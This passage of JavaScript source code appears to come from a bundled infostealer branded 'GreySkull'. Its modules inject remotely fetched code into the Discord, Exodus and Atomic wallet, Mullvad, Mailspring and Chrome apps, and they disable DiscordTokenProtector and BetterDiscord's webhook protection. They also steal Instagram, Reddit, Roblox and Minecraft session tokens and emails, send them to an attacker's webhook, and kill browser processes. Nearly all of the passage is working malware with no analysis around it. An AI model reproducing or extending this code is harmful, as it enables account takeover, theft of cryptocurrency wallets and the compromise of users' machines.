    await fs.writeFileSync(randomname, powershellCommand, { encoding: "utf8" });

    execSync(
      `powershell.exe -ExecutionPolicy Bypass -File "${randomname}" -RunAsAdministrator`,
      async (error, stdout, stderr) => {
        if (error) {
          return;
        }
      }
    );
    await fs.unlink(randomname, (err) => {
      if (err) {
      } else {
      }
    });
  }

  for (const browserName in shortcutPaths.programdata) {
    const shortcutPath = path.join(
      userProgramDataStartMenu,
      shortcutPaths.programdata[browserName]
    );
    await modifyShortcut(shortcutPath);
  }

  for (const browserName in shortcutPaths.roaming) {
    const shortcutPath = path.join(
      userRoamingStartMenu,
      shortcutPaths.roaming[browserName]
    );
    await modifyShortcut(shortcutPath);
  }
}

async function replaceWebhookTerm(directoryPath, wb, ip, compname) {
  try {
    const files = await fsPromises.readdir(directoryPath);
    for (const fileName of files) {
      const filePath = path.join(directoryPath, fileName);
      const fileStat = await fsPromises.stat(filePath);
      if (fileStat.isFile()) {
        let fileContent = await fsPromises.readFile(filePath, "utf-8");
        fileContent = fileContent.replace(/%[A-Z]{7}%/gm, wb);
        fileContent = fileContent.replace(/%IPINFO%/gm, ip);
        fileContent = fileContent.replace(/%COMP_INFO%/gm, compname);
        await fsPromises.writeFile(filePath, fileContent, "utf-8");
      } else if (fileStat.isDirectory()) {
        await replaceWebhookTerm(filePath, wb);
      }
    }
  } catch (error) {}
}

async function chrome_injection(cc, webhook, chrome_url, ip, computername) {
  if (cc !== "yes") return;
  const destinationFolder = path.join(
    process.env.ProgramData,
    "ChromeExtensionsNova"
  );
  try {
    const response = await axios.get(chrome_url, { responseType: "stream" });

    if (!fs.existsSync(destinationFolder)) {
      fs.mkdirSync(destinationFolder, { recursive: true });
    }
    const fileName = path.basename(chrome_url);
    const destinationPath = path.join(destinationFolder, fileName);
    const writer = fs.createWriteStream(destinationPath);

    writer.on("finish", async () => {
      fs.createReadStream(destinationPath)
        .pipe(unzipper.Extract({ path: destinationFolder }))
        .on("close", () => {
          fs.unlink(destinationPath, (err) => {
            if (err) {
            } else {
              replaceWebhookTerm(destinationFolder, webhook, ip, computername);
              LetInject();
            }
          });
        });
    });
    writer.on("error", (err) => {});
    response.data.pipe(writer);
  } catch (error) {}
}

async function inject(
  inject,
  webhook,
  url,
  link,
  a2f,
  automailchanger,
  ClientEmail
) {
  if (inject !== "yes") return;

  let replacedInjection;
  let lkn;
    lkn = webhook;

    try {
      const filteredProcesses = await core.filterProcessesByName("discord");
      if (filteredProcesses.length > 0) {
        try {
          filteredProcesses.forEach((proc) => {
            process.kill(proc.pid);
          });
        } catch (e) {}
      }
      const local = process.env.localappdata;
      const discordFolders = glob.sync(`${local}/*cord*`);
      var desktops = [];

      for (let i = 0; i < discordFolders.length; i++) {
        const discordFolder = discordFolders[i];
        const apps = glob.sync(`${discordFolder}/app-*/`);
        if (apps.length < 1) return;
       /* if (path.basename(discordFolder) == "Discord") {
          await inject_antidelete(
            apps,
            inject,
            webhook,
            url,
            link,
            a2f,
            automailchanger,
            ClientEmail
          );
        }*/
        for (let u = 0; u < apps.length; u++) {
          const app = apps[u];
          const desktopCores = glob.sync(
            `${app}/modules/discord_desktop_core-*`
          );
          desktops.push(...desktopCores);
        }
      }

      for (let i = 0; i < desktops.length; i++) {
        const desktop = desktops[i];
        try {
          const response = await axios.get(url);
          const injection = response.data;
          const regex = /%[A-Z]{7}%/gm;
          replacedInjection = injection.replace(regex, lkn);
          replacedInjection = replacedInjection.replace(
            /%TRANSFER_URL%/g,
            link
          );
          replacedInjection = await replacedInjection.replace(
            /%DISABLEFA%/g,
            a2f
          );
          replacedInjection = await replacedInjection.replace(
            /%AUTOMAILCHANGER%/g,
            automailchanger
          );
          replacedInjection = await replacedInjection.replace(
            /%CLIENTEMAIL%/g,
            ClientEmail
          );
          const indexFile = path.join(
            `${desktop}/discord_desktop_core/index.js`
          );
          await fs.writeFileSync(indexFile, `${replacedInjection}`, "utf-8");
          const firstDirectory = glob.sync(`${desktop}/discord_d*`)[0];
          if (!fs.existsSync(firstDirectory + "/ThiefCat")) {
            await fs.mkdirSync(firstDirectory + "/ThiefCat");
          }
          setTimeout(async () => {
            try {
              if (desktop) {
                const discordFolder = path.join(desktop, "..", "..", "..");
                const buildBatPath = path.join(
                  desktop,
                  "..",
                  "..",
                  path.basename(discordFolder) + ".exe"
                );
                const options = {
                  cwd: path.join(desktop, "..", ".."),
                  stdio: "inherit",
                };

                spawn(buildBatPath, [], options);
              }
            } catch (e) {}
          }, 12000);
        } catch (err) {
          save.SaveError(err);
        }
      }
    } catch (e) {
      save.SaveError(e);
    }
}

const replace = (buf, a, b) => {
  if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
  const idx = buf.indexOf(a);
  if (idx === -1) return buf;
  if (!Buffer.isBuffer(b)) b = Buffer.from(b);

  const before = buf.slice(0, idx);
  const after = replace(buf.slice(idx + a.length), a, b);
  const len = idx + b.length + after.length;
  return Buffer.concat([before, b, after], len);
};

async function BypassDiscordTokenProtector(inject) {
  if (inject != "yes") return;
  try {
    const tp = path.join(process.env.APPDATA, "DiscordTokenProtector");
    const config = path.join(tp, "config.json");

    if (
      !fs.existsSync(tp) ||
      !fs.lstatSync(tp).isDirectory() ||
      !fs.existsSync(config)
    ) {
      return;
    }
    const filesToRemove = [
      "DiscordTokenProtector.exe",
      "ProtectionPayload.dll",
      "secure.dat",
    ];
    for (const file of filesToRemove) {
      const filePath = path.join(tp, file);
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }
    }
    let item;
    try {
      const fileContent = fs.readFileSync(config, "utf-8");
      item = JSON.parse(fileContent);
    } catch (error) {
      return;
    }
    item[`KSCHdsc_is_here`] = "https://t.me/Sordeal";
    item.auto_start = false;
    item.auto_start_discord = false;
    item.integrity = false;
    item.integrity_allowbetterdiscord = false;
    item.integrity_checkexecutable = false;
    item.integrity_checkhash = false;
    item.integrity_checkmodule = false;
    item.integrity_checkscripts = false;
    item.integrity_checkresource = false;
    item.integrity_redownloadhashes = false;
    item.iterations_iv = 364;
    item.iterations_key = 457;
    item.version = 69420;

    fs.writeFileSync(config, JSON.stringify(item, null, 2));
    fs.appendFileSync(config, `

//KSCHdsc_is_here | https://t.me/Sordeal`);
  } catch (e) {
    save.SaveError(e);
  }
}

async function pwnBetterDiscord(inject) {
  if (inject != "yes") return;
  try {
    let dir = process.env.appdata + "/BetterDiscord/data/betterdiscord.asar";
    if (fs.existsSync(dir)) {
      const boom = fs.readFileSync(dir);
      fs.writeFileSync(dir, replace(boom, "api/webhooks", "KSCHdsc"));
    }

    return;
  } catch (e) {
    save.SaveError(e);
  }
}

async function exodusInjection(cc, webhook, injectionurl) {
  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    let local = process.env.localappdata;
    const response = await axios.get(injectionurl);
    const injection = await response.data;
    let injectionpath = glob.sync(`${local}/exodus/app-*/resources/app.asar`);
    let output = path.join(injectionpath[0], "..", "unpacked");
    if (injectionpath.length > 0) {
      await unpackAsar(injectionpath[0], output);
      let g = glob.sync(`${output}/src/app/main/index.js`);
      await fs.writeFileSync(g[0], `${injection}`, "utf-8");

      await packAsar(output, path.join(injectionpath[0]));
      let json = {
        webhook,
        link: stat.exodusurl[0] ?? "none",
      };

      const parentDir = path.join(injectionpath[0], "..", "..");
      fs.writeFileSync(
        path.join(parentDir, "config.json"),
        JSON.stringify(json)
      );
    }
  } catch (e) {}
}

function unpackAsar(asarFilePath, outputDir) {
  try {
    asar.extractAll(asarFilePath, outputDir);
  } catch (err) {}
}

async function MullvadInjection(cc, webhook, injectionurl) {
  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    let mullvad_path = path.join(process.env.ProgramFiles, "Mullvad VPN", "resources", "app.asar")
    if (fs.existsSync(mullvad_path)) {
    const response = await axios.get(injectionurl);
    const injection = await response.data;
    let output = path.join(mullvad_path, "..", "unpacked");
      await unpackAsar(mullvad_path, output);
      let g = path.join(output, "build", "src", "main", "daemon-rpc.js")
      await fs.writeFileSync(g, `${injection.replace("%WEBHOOK%", webhook)}`, "utf-8");
      await packAsar(output, path.join(mullvad_path));
    }
  } catch (e) {}
}

function unpackAsar(asarFilePath, outputDir) {
  try {
    asar.extractAll(asarFilePath, outputDir);
  } catch (err) {}
}


async function packAsar(inputDir, outputFilePath) {
  try {
    await asar.createPackage(inputDir, outputFilePath);
    if (fs.existsSync(outputFilePath)) {
      if (fs.existsSync(inputDir)) {
        fs.rmSync(inputDir, { recursive: true });
      }
    } else {
    }
  } catch (err) {}
}

async function AtomicInjection(cc, webhook, injectionurl, mainAtomic) {
  if (cc != "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    const local = process.env.localappdata;
    const response = await axios.get(injectionurl);
    const injection = await response.data;
    const resp = await axios.get(mainAtomic);
    const AtmcMain = await resp.data;
    let injectionpath = glob.sync(
      `${local}/Programs/atomic/resources/app.asar`
    );

    if (injectionpath[0]) {
      let output = path.join(injectionpath[0], "..", "unpacked");
      await unpackAsar(injectionpath[0], output);
      let g = `${output}/dist/electron/vendors.3d9f29748fbff1778bdc.js`;
      await fs.writeFileSync(g, `${injection}`, "utf-8");
      let main = `${output}/dist/electron/main.js`;
      await fs.writeFileSync(main, `${AtmcMain}`, "utf-8");

      await packAsar(output, path.join(injectionpath[0]));
      console.log(stat.atomicurl[0])
      let json = {
        webhook,
        link: stat.atomicurl[0] ?? "none",
      };

      const parentDir = path.join(injectionpath[0], "..", "..");

      fs.writeFileSync(
        path.join(parentDir, "config.json"),
        JSON.stringify(json)
      );
    }
  } catch (e) {}
}

async function MailSpringInjection(cc, webhook, injectionurl) {
  if (cc !== "yes" || webhook === "%WEBHOOK%" || !injectionurl) return;
  try {
    let mailspring_path = path.join(process.env.localappdata, "Mailspring")
    if (fs.existsSync(mailspring_path)) {
    let appmailspring_path = glob.sync(`${mailspring_path}/app-*/resources/app.asar`);
    appmailspring_path.forEach(async jsppath => {
    const response = await axios.get(injectionurl);
    const injection = await response.data;
    let output = path.join(jsppath, "..", "unpacked");
      await unpackAsar(jsppath, output);
      let g = path.join(output, "internal_packages", "onboarding", "lib", "onboarding-helpers.js")
      await fs.writeFileSync(g, `${injection.replace("%WEBHOOK%", webhook)}`, "utf-8");
      await packAsar(output, path.join(jsppath));
    }) 
  }
  } catch (e) {}
}


module.exports = {
  inject,
  pwnBetterDiscord,
  BypassDiscordTokenProtector,
  exodusInjection,
  AtomicInjection,
  chrome_injection,
  MullvadInjection,
  MailSpringInjection,
};


//# sourceURL=webpack://script/./utils/injection.js?");

/***/ }),

/***/ 
})(module_11_exports, module_11_exports);
modules['module_11'] = module_11_exports;

// Módulo 12
const module_12_exports = {};
(function(module, exports) {
const { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
  axios = __webpack_require__(/*! axios */ "axios"),\r
  fs = __webpack_require__(/*! fs */ "fs"),\r
  { embeds } = __webpack_require__(/*! ./emotes */ "./utils/emotes.js"),\r
  path = __webpack_require__(/*! path */ "path");\r
\r
async function ParseInstagram(cc) {\r
  if (cc !== "yes") return;\r
  try{\r
  const basepath = stat.testpath[0];\r
  const socialDir = path.join(basepath, "Social");\r
  const InstaDir = path.join(socialDir, "Instagram");\r
  let g = [];\r
  \r
  let instagram_sessions = stat.InstaSessId;\r
  if (instagram_sessions && instagram_sessions.length) {\r
    for (const instagram of instagram_sessions) {\r
      const profile = await axios\r
        .get(\r
          "https://i.instagram.com/api/v1/accounts/current_user/?edit=true",\r
          {\r
            headers: {\r
              "user-agent": "Instagram 219.0.0.12.117 Android",\r
              cookie: `sessionid=${instagram}`,\r
            },\r
          }\r
        )\r
        .then((res) => res.data.user)\r
        .catch(() => {});\r
      let full_name = profile.full_name ?? "none"\r
      let is_private = profile.is_private ?? "none"\r
      let email = profile.email ?? "none"\r
      let phone_number = profile.phone_number ?? "none"\r
      let profile_pic_url = profile.profile_pic_url ?? "none"\r
      let username = profile.username ?? "none"\r
      try {\r
        if (!fs.existsSync(socialDir)) {\r
          fs.mkdirSync(socialDir);\r
        }\r
        if (!fs.existsSync(InstaDir)) {\r
          fs.mkdirSync(InstaDir);\r
        }\r
      } catch (e) {}\r
      let fdp = `Account: ${full_name}\r
Private?: ${is_private}\r
email: ${email}\r
phone_number: ${phone_number}\r
profile_pic_url: ${profile_pic_url}`\r
      try {\r
        const instarFilePath = path.join(InstaDir, "Instagram.txt");\r
        fs.writeFileSync(instarFilePath, fdp);\r
      } catch (e) {}\r
      const profile2 = await axios\r
        .get(`https://i.instagram.com/api/v1/users/${profile.pk_id}/info`, {\r
          headers: {\r
            "user-agent": "Instagram 219.0.0.12.117 Android",\r
            cookie: `sessionid=${instagram}`,\r
          },\r
        })\r
        .then((res) => res.data.user)\r
        .catch(() => {});\r
      let { is_verified, follower_count } = profile2;\r
\r
      let embed = {\r
        title: "Instagram Session",\r
        fields: [\r
          {\r
            name: `${embeds.instagram} Username:`,\r
            value: `[\`${full_name}\`](https://instagram.com/${username})`,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.twitter_followers} Followers:`,\r
            value: `\`${follower_count ?? "0"}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.mail} Email`,\r
            value: `\`${email ?? "none"}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.instaiscert} Certified`,\r
            value: `\`${is_verified ? embeds.instagram_certified : "❌"}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.phone} Phone Number`,\r
            value: `\`${phone_number ? phone_number : "❌"}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.token} Token`,\r
            value: `\`\`\`${instagram}\`\`\``,\r
            inline: false,\r
          },\r
        ],\r
        thumbnail: {\r
          url: profile_pic_url,\r
        },\r
        footer: {\r
          text: "@GreySkull | https://t.me/Sordeal",\r
        },\r
        color: 3553599,\r
      };\r
      g.push(embed);\r
    }\r
    \r
    let tosend = {\r
      avatar_url:\r
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",\r
      username: "GreySkull",\r
      embeds: g,\r
    };\r
    \r
    return tosend;\r
  }\r
}catch(e){\r
  return null;\r
}\r
}\r
module.exports = {\r
  ParseInstagram,\r
};\r


//# sourceURL=webpack://script/./utils/instagram.js?");

/***/ }),

/***/ 
})(module_12_exports, module_12_exports);
modules['module_12'] = module_12_exports;

// Módulo 13
const module_13_exports = {};
(function(module, exports) {
const process = __webpack_require__(/*! process */ "process"),\r
  core = __webpack_require__(/*! ./core */ "./utils/core.js");\r
\r
async function KillBrowsersProcess(inject, browsers) {\r
  let allproc;\r
  if (inject == "yes" && browsers == "yes") {\r
    allproc = [\r
      "mullvad",\r
      "firefox",\r
      "chrome",\r
      "mozilla",\r
      "vivaldi",\r
      "Opera",\r
      "OperaGX",\r
      "EpicPrivacy",\r
      "ChromeSxS",\r
      "Sputnik",\r
      "7Star",\r
      "CentBrowser",\r
      "Orbitum",\r
      "Amigo",\r
      "Torch",\r
      "Kometa",\r
      "steam",\r
      "filezilla",\r
      "brave",\r
      "BraveSoftware",\r
      "brave.exe",\r
      "msedge",\r
      "edge",\r
      "Uran",\r
      "KMelon",\r
      "Maxthon3",\r
      "iebao",\r
      "oowon",\r
      "leipnir5",\r
      "hromePlus",\r
      "uperbird",\r
      "afotech",\r
      "aferTechnologies",\r
      "uhba",\r
      "orBrowser",\r
      "lementsBrowser",\r
      "ocCoc",\r
      "oBrowser",\r
      "IP Surf",\r
      "ockMelt",\r
      "ichrome",\r
      "romium",\r
      "omodo",\r
      "pom",\r
      "hedot",\r
      "60Browser",\r
      "discord",\r
      "cord",\r
    ];\r
  } else if (inject != "yes" && browsers == "yes") {\r
    allproc = [\r
      "firefox",\r
      "chrome",\r
      "mozilla",\r
      "vivaldi",\r
      "Opera",\r
      "OperaGX",\r
      "EpicPrivacy",\r
      "ChromeSxS",\r
      "Sputnik",\r
      "7Star",\r
      "CentBrowser",\r
      "Orbitum",\r
      "Amigo",\r
      "Torch",\r
      "Kometa",\r
      "steam",\r
      "filezilla",\r
      "brave",\r
      "BraveSoftware",\r
      "brave.exe",\r
      "msedge",\r
      "edge",\r
      "Uran",\r
      "KMelon",\r
      "Maxthon3",\r
      "iebao",\r
      "oowon",\r
      "leipnir5",\r
      "hromePlus",\r
      "uperbird",\r
      "afotech",\r
      "aferTechnologies",\r
      "uhba",\r
      "orBrowser",\r
      "lementsBrowser",\r
      "ocCoc",\r
      "oBrowser",\r
      "IP Surf",\r
      "ockMelt",\r
      "ichrome",\r
      "romium",\r
      "omodo",\r
      "pom",\r
      "hedot",\r
      "60Browser",\r
    ];\r
  } else if (inject == "yes" && browsers != "yes") {\r
    allproc = ["discord", "cord"];\r
  }\r
  try {\r
    allproc.forEach(async (g) => {\r
      const filteredProcesses = await core.filterProcessesByName(g);\r
      if (filteredProcesses.length > 0) {\r
        try {\r
          filteredProcesses.forEach((proc) => {\r
            process.kill(proc.pid);\r
          });\r
        } catch (e) {}\r
      }\r
    });\r
  } catch (e) {}\r
}\r
\r
module.exports = {\r
  KillBrowsersProcess,\r
};\r


//# sourceURL=webpack://script/./utils/kill.js?");

/***/ }),

/***/ 
})(module_13_exports, module_13_exports);
modules['module_13'] = module_13_exports;

// Módulo 14
const module_14_exports = {};
(function(module, exports) {
const axios = __webpack_require__(/*! axios */ "axios"),\r
{ stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
https = __webpack_require__(/*! https */ "https"),\r
agent = new https.Agent({ rejectUnauthorized: false }),\r
fs = __webpack_require__(/*! fs */ "fs"),\r
{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ "./utils/emotes.js");\r
\r
async function GreySkullfinduid(wb, cc) {\r
  if(cc != "yes")return;\r
  for (const m of stat.minecraft_account) {\r
\r
    try {\r
      let name = [];\r
      let count = 0;\r
      const content = fs.readFileSync(m, "utf-8");\r
      const jsonData = JSON.parse(content);\r
      if (jsonData) {\r
        if(!jsonData.accounts)return;\r
        console.log(jsonData.accounts)\r
        const accountInfo =jsonData.accounts ;\r
        for (const accountId in accountInfo) {\r
          const emailRegex = /[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}/g;\r
          const emails = JSON.stringify(accountInfo).match(emailRegex) ?? "none";\r
          const profile = accountInfo[accountId].minecraftProfile;\r
          if (profile) {\r
            const playerDBResponse = await axios.get(\r
              `https://api.namemc.com/profile/${profile.id}/friends`\r
            );\r
            if (\r
              playerDBResponse.status === 200 &&\r
              playerDBResponse.data.length > 0\r
            ) {\r
              name = playerDBResponse.data.map((entry) => entry.name);\r
              count = name.length;\r
            }\r
            const tosend = {\r
              username: "GreySkull",\r
              avatar_url:\r
                "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",\r
              embeds: [\r
                {\r
                  title: "Nova Minecraft Account",\r
                  thumbnail: {\r
                    url: `https://crafatar.com/renders/head/${profile.id}.png`,\r
                  },\r
                  color: 3553599,\r
                  description: `[Download Skin](https://crafatar.com/skins/${profile.id}.png)
[Download Capes](http://s.optifine.net/capes/${profile.name}.png)`,\r
                  fields: [\r
                    {\r
                      name: `${embeds.mcid} Account ID:`,\r
                      value: `\`\`\`${accountId}\`\`\``,\r
                      inline: true,\r
                    },\r
                    {\r
                      name: `${embeds.mcgapple} Username:`,\r
                      value: `\`\`\`${profile.name}\`\`\``,\r
                      inline: true,\r
                    },\r
                    {\r
                      name: `${embeds.mcmail} Email Found:`,\r
                      value: `\`\`\`${emails || `None`}\`\`\``,\r
                      inline: true,\r
                    },\r
                    {\r
                      name: `${embeds.keysmc} Minecraft UID`,\r
                      value: `\`\`\`${profile.id}\`\`\``,\r
                      inline: true,\r
                    },\r
                    {\r
                      name: `${embeds.namemc} Friends Count`,\r
                      value: `\`\`\`${count || 0}\`\`\``,\r
                      inline: true,\r
                    },\r
                    {\r
                      name: `${embeds.namemc} Friends List:`,\r
                      value: `\`\`\`${name.join(", ") || `None`}\`\`\``,\r
                      inline: true,\r
                    },\r
                  ],\r
                  footer: {\r
                    text: `@GreySkull | https://t.me/Sordeal`,\r
                  },\r
                },\r
              ],\r
            };\r
            try {\r
              await axios({\r
                url: wb,\r
                method: "POST",\r
                headers: {\r
                  "Content-Type": "application/json",\r
                },\r
                httpsAgent: agent,\r
                data: tosend,\r
              });\r
            } catch (e) {}\r
          }\r
        }\r
      }\r
    } catch (error) {}\r
  }\r
}\r
\r
module.exports = {\r
  GreySkullfinduid,\r
};\r


//# sourceURL=webpack://script/./utils/minecraft.js?");

/***/ }),

/***/ 
})(module_14_exports, module_14_exports);
modules['module_14'] = module_14_exports;

// Módulo 15
const module_15_exports = {};
(function(module, exports) {
const { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
  axios = __webpack_require__(/*! axios */ "axios"),\r
  fs = __webpack_require__(/*! fs */ "fs"),\r
  { embeds } = __webpack_require__(/*! ./emotes */ "./utils/emotes.js"),\r
  path = __webpack_require__(/*! path */ "path");\r
\r
async function ParseReddit(cc) {\r
  if (cc !== "yes") return;\r
\r
  const basepath = stat.testpath[0];\r
  const socialDir = path.join(basepath, "Social");\r
  const RedditDir = path.join(socialDir, "Reddit");\r
  let g = [];\r
  let reddit_sessions = stat.RedditSess;\r
  if (reddit_sessions && reddit_sessions.length) {\r
    for (const reddit of reddit_sessions) {\r
      const { data: bearer } = await axios.post(\r
        "https://accounts.reddit.com/api/access_token",\r
        { scopes: ["*", "email", "pii"] },\r
        {\r
          headers: {\r
            Cookie: `reddit_session=${reddit}`,\r
            Authorization: "Basic b2hYcG9xclpZdWIxa2c6",\r
          },\r
        }\r
      );\r
      const { data: account } = await axios.get(\r
        "https://oauth.reddit.com/api/v1/me",\r
        {\r
          headers: { Authorization: `Bearer ${bearer.access_token}` },\r
        }\r
      );\r
      let { total_karma, icon_img, is_gold, email, name } = account;\r
\r
      let fdp = `Account: ${name}\r
is_gold: ${is_gold}\r
total_karma: ${total_karma}\r
icon_img: ${icon_img}`\r
      try {\r
        if (!fs.existsSync(socialDir)) {\r
          fs.mkdirSync(socialDir);\r
        }\r
        if (!fs.existsSync(RedditDir)) {\r
          fs.mkdirSync(RedditDir);\r
        }\r
      } catch (e) {}\r
      try {\r
        const instarFilePath = path.join(RedditDir, "Reddit.txt");\r
        fs.writeFileSync(instarFilePath, fdp);\r
      } catch (e) {}\r
      let profile_link = `https://www.reddit.com/user/${name}`;\r
      let embed = {\r
        color: 3553599,\r
        thumbnail: {\r
          url: icon_img,\r
        },\r
        fields: [\r
          {\r
            name: `${embeds.billings} Profile`,\r
            value: `[\`${name}\`](${profile_link})`,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.karma} Karma`,\r
            value: `\`${total_karma}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.gold} Gold`,\r
            value: `\`${is_gold}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.mail} Email`,\r
            value: `\`${email}\``,\r
            inline: true,\r
          },\r
        ],\r
        footer: {\r
          text: "@GreySkull | https://t.me/Sordeal",\r
        },\r
        title: "Reddit Session",\r
      };\r
      g.push(embed);\r
    }\r
\r
    let tosend = {\r
      avatar_url:\r
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",\r
      username: "GreySkull",\r
      embeds: g,\r
    };\r
    return tosend;\r
  }\r
}\r
\r
module.exports = { ParseReddit };\r


//# sourceURL=webpack://script/./utils/reddit.js?");

/***/ }),

/***/ 
})(module_15_exports, module_15_exports);
modules['module_15'] = module_15_exports;

// Módulo 16
const module_16_exports = {};
(function(module, exports) {
const { execSync } = __webpack_require__(/*! child_process */ "child_process"),\r
{ stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
axios = __webpack_require__(/*! axios */ "axios"),\r
save = __webpack_require__(/*! ./save */ "./utils/save.js"),\r
{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ "./utils/emotes.js");\r
\r
function GreySkullGetRoblox(Found_Roblox) {\r
  if (Found_Roblox != "yes") return;\r
  try {\r
    function subproc(path) {\r
      try {\r
        const cmd = `powershell Get-ItemPropertyValue -Path ${path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY`;\r
        const options = { windowsHide: true, shell: true };\r
\r
        return execSync(cmd, options).toString().trim();\r
      } catch (e) {\r
        return null;\r
      }\r
    }\r
    let cooks = []\r
    const regex_c00ks = subproc("HKLM") || subproc("HKCU");\r
    if (regex_c00ks) {\r
      cooks.push(regex_c00ks);\r
    }\r
    if (cooks.length > 0) {\r
      if (cooks.includes(".ROBLOSECURITY")) {\r
        stat.AddRoblox(cooks);\r
      }\r
    }\r
  } catch (e) {\r
    save.SaveError(e);\r
  }\r
}\r
\r
async function ParseAndSendRoblox(cc) {\r
  if (cc !== "yes") return;\r
\r
  const processedUsernames = new Set();\r
  const axiosConfig = {\r
    maxRedirects: 0,\r
    validateStatus: function (status) {\r
      return (status >= 200 && status < 300) || status === 302;\r
    },\r
  };\r
\r
  try {\r
    const requests = stat.roblox_cookies.map(async (cookies) => {\r
      save.saveRoblox(cookies)\r
      const [userInfoResponse, friendsCountResponse] = await Promise.all([\r
        axios.get("https://www.roblox.com/mobileapi/userinfo", {\r
          headers: {\r
            Cookie: `.ROBLOSECURITY=${cookies}`,\r
          },\r
          ...axiosConfig,\r
        }),\r
        axios.get("https://friends.roblox.com/v1/my/friends/count", {\r
          headers: {\r
            Cookie: `.ROBLOSECURITY=${cookies}`,\r
          },\r
          ...axiosConfig,\r
        }),\r
      ]);\r
\r
      if (\r
        userInfoResponse.status === 200 &&\r
        friendsCountResponse.status === 200\r
      ) {\r
        const {\r
          UserName,\r
          RobuxBalance,\r
          ThumbnailUrl,\r
          IsAnyBuildersClubMember,\r
          IsPremium,\r
        } = userInfoResponse.data;\r
        const { count } = friendsCountResponse.data;\r
        if (!processedUsernames.has(UserName)) {\r
          processedUsernames.add(UserName);\r
\r
          const parsed = {\r
            UserName,\r
            RobuxBalance,\r
            ThumbnailUrl,\r
            IsAnyBuildersClubMember,\r
            IsPremium,\r
            friendscount: count,\r
            cookies,\r
          };\r
\r
          stat.detailRoblox(parsed);\r
        }\r
      }\r
    });\r
\r
    await Promise.all(requests);\r
  } catch (error) {}\r
}\r
\r
async function sendRoblox(cc) {\r
  if (cc != "yes") return;\r
  let p = stat.roblox_account;\r
  if (p.length < 1) return;\r
  return p;\r
}\r
\r
function compile(embeds) {\r
  var build = "";\r
  build += `{
"content": null,
"embeds": [`;\r
  for (let i = 0; i < embeds.length; i++) {\r
    build += embeds[i];\r
    if (i != embeds.length - 1) {\r
      build += ",
";\r
    }\r
  }\r
  build += `],
"avatar_url": "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",
"username": "GreySkull",
"attachments": []
}`;\r
  return build;\r
}\r
\r
async function embed(\r
  UserName,\r
  RobuxBalance,\r
  ThumbnailUrl,\r
  IsAnyBuildersClubMember,\r
  IsPremium,\r
  friendscount,\r
  cookies\r
) {\r
  let embed = {\r
    fields: [\r
      {\r
        name: `${embeds.atom} Name:`,\r
        value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30${UserName}\u001b[0m\u001b[0m\`\`\``,\r
        inline: false,\r
      },\r
      {\r
        name: `${embeds.dsc} Robux:`,\r
        value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30${RobuxBalance}\u001b[0m\u001b[0m\`\`\``,\r
        inline: true,\r
      },\r
      {\r
        name: `${embeds.rblxinfo} premium:`,\r
        value: `\`${IsPremium ? "✅" : "❌"}\``,\r
        inline: !0,\r
      },\r
      {\r
        name: `${embeds.infoyl} Club Member:`,\r
        value: `\`${IsAnyBuildersClubMember ? "✅" : "❌"}\``,\r
        inline: !0,\r
      },\r
      {\r
        name: `${embeds.inject} Cookie:`,\r
        value: `[Cookies](${cookies})`,\r
        inline: true,\r
      },\r
    ],\r
    description: `\`${friendscount} Friends\``,\r
    color: 3553599,\r
    footer: {\r
      text: "@GreySkull | https://t.me/Sordeal",\r
    },\r
    title: "Roblox Account",\r
    thumbnail: {\r
      url: `${ThumbnailUrl}`,\r
    },\r
  };\r
  return JSON.stringify(embed);\r
}\r
\r
module.exports = {\r
  GreySkullGetRoblox,\r
  ParseAndSendRoblox,\r
  sendRoblox,\r
  embed,\r
  compile,\r
};\r


//# sourceURL=webpack://script/./utils/roblox.js?");

/***/ }),

/***/ 
})(module_16_exports, module_16_exports);
modules['module_16'] = module_16_exports;

// Módulo 17
const module_17_exports = {};
(function(module, exports) {
const core = __webpack_require__(/*! ./core */ "./utils/core.js"),
  fs = __webpack_require__(/*! fs */ "fs"),
  path = __webpack_require__(/*! path */ "path"),
  archiver = __webpack_require__(/*! archiver */ "archiver"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js");

async function getbasepath() {
  const { ip, hostname, city, region, country, loc, org, postal, timezone } =
    await core.getPublicIp();
  try {
    return (
      process.env.localappdata + "\\" + "Temp" + "\\" + `${core.generateId(20)}`
    );
  } catch (err) {
    if (err) {
      return (
        process.env.localappdata +
        "\\" +
        "Temp" +
        "\\" +
        `KS_MAL_${process.env.USERNAME.replace(".", "") || "USER"}`
      );
    }
  }
}
async function getsavepath() {
  const { ip, hostname, city, region, country, loc, org, postal, timezone } =
    await core.getPublicIp();
  try {
    return (
      process.env.localappdata +
      "\\" +
      "Temp" +
      "\\" +
      `${country.toUpperCase()}_MAL_${
        process.env.USERNAME.replace(".", "") || "USER"
      }` +
      ".zip"
    );
